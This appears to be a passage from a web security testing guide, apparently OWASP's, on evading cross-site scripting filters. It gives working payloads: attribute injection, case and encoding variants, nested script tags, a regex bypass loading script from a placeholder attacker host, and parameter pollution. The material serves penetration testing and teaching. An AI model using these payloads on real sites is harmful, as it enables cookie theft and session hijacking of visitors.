<title>Bypassing XSS Filters</title>
</head><body><b>&nbsp;Bypass XSS filters </b><br/>
Reflected cross-site scripting attacks are prevented as the web application sanitizes input, a web application firewall blocks malicious input, or by mechanisms embedded in modern web browsers. The tester must test for vulnerabilities assuming that web browsers will not prevent the attack. Browsers may be out of date, or have built-in security features disabled. Similarly, web application firewalls are not guaranteed to recognize novel, unknown attacks. An attacker could craft an attack string that is unrecognized by the web application firewall. <br/>
<br/>
Thus, the majority of XSS prevention must depend on the web application's sanitization of untrusted user input. There are several mechanisms available to developers for sanitization, such as returning an error, removing, encoding, or replacing invalid input. The means by which the application detects and corrects invalid input is another primary weakness in preventing XSS. A blacklist may not include all possible attack strings, a whitelist may be overly permissive, the sanitization could fail, or a type of input may be incorrectly trusted and remain unsanitized. All of these allow attackers to circumvent XSS filters. <br/>
<br/>
The <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a>&nbsp;documents common filter evasion tests. <br/>
<br/>
<br/>
<b>Example 3: Tag Attribute Value </b><br/>
Since these filters are based on a blacklist, they could not block every type of expressions. In fact, there are cases in which an XSS exploit can be carried out without the use of &lt;script&gt; tags and even without the use of characters such as " &lt; &gt; and / that are commonly filtered. <br/>
<br/>
For example, the web application could use the user input value to fill an attribute, as shown in the following code: <br/>
&lt;input type="text" name="state" value="INPUT_FROM_USER"&gt;<br/>
<br/>
<br/>
Then an attacker could submit the following code:<br/>
" onfocus="alert(document.cookie)<br/>
&nbsp; <br/>
<br/>
<b>Example 4: Different syntax or encoding </b><br/>
In some cases it is possible that signature-based filters can be simply defeated by obfuscating the attack. Typically you can do this through the insertion of unexpected variations in the syntax or in the enconding. These variations are tolerated by browsers as valid HTML when the code is returned, and yet they could also be accepted by the filter. <br/>
<br/>
Following some examples: <br/>
"&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;<br/>
"&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;<br/>
"%3cscript%3ealert(document.cookie)%3c/script%3e<br/>
<br/>
<br/>
<b>Example 5: Bypassing non-recursive filtering</b><br/>
Sometimes the sanitization is applied only once and it is not being performed recursively. In this case the attacker can beat the filter by sending a string containing multiple attempts, like this one:<br/>
&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;<br/>
<br/>
<br/>
<b>Example 6: Including external script</b><br/>
Now suppose that developers of the target site implemented the following code to protect the input from the inclusion of external script:<br/>
<br/>
&lt;?<br/>
&nbsp; &nbsp;$re = "/&lt;script[^&gt;]+src/i";<br/>
<br/>
&nbsp; &nbsp;if (preg_match($re, $_GET['var'])) <br/>
&nbsp; &nbsp;{<br/>
&nbsp; &nbsp; &nbsp; echo "Filtered";<br/>
&nbsp; &nbsp; &nbsp; return; <br/>
&nbsp; &nbsp;}<br/>
&nbsp; &nbsp;echo "Welcome ".$_GET['var']." !";<br/>
?&gt;<br/>
<br/>
<br/>
In this scenario there is a regular expression checking if &lt;script [anything but the character: '&gt;' ] src is inserted. This is useful for filtering expressions like<br/>
&lt;script src="http://attacker/xss.js"&gt;&lt;/script&gt;<br/>
<br/>
which is a common attack. But, in this case, it is possible to bypass the sanitization by using the "&gt;" character in an attribute between script and src, like this:<br/>
http://example/?var=&lt;SCRIPT%20a="&gt;"%20SRC="http://attacker/xss.js"&gt;&lt;/SCRIPT&gt; <br/>
<br/>
<br/>
This will exploit the reflected cross site scripting vulnerability shown before, executing the javascript code stored on the attacker's web server as if it was originating from the victim web site, http://example/. <br/>
<br/>
<br/>
<b>Example 7: HTTP Parameter Pollution (HPP) </b><br/>
Another method to bypass filters is the HTTP Parameter Pollution, this technique was first presented by Stefano di Paola and Luca Carettoni in 2009 at the OWASP Poland conference. See the <a href="https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)">Testing for HTTP Parameter pollution</a>&nbsp;for more information. This evasion technique consists of splitting an attack vector between multiple parameters that have the same name. The manipulation of the value of each parameter depends on how each web technology is parsing these parameters, so this type of evasion is not always possible. If the tested environment concatenates the values of all parameters with the same name, then an attacker could use this technique in order to bypass pattern- based security mechanisms. <br/>
<br/>
Regular attack: <br/>
http://example/page.php?param=&lt;script&gt;[...]&lt;/script&gt;<br/>
<br/>
Attack using HPP:<br/>
http://example/page.php?param=&lt;script&amp;param=&gt;[...]&lt;/&amp;param=script&gt;<br/>
&nbsp; <br/>
<br/>
<br/>
<b>Result expected </b>&nbsp;<br/>
See the <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a>&nbsp;for a more detailed list of filter evasion techniques. Finally, analyzing answers can get complex. A simple way to do this is to use code that pops up a dialog, as in our example. This typically indicates that an attacker could execute arbitrary JavaScript of his choice in the visitors' browsers. <br/>
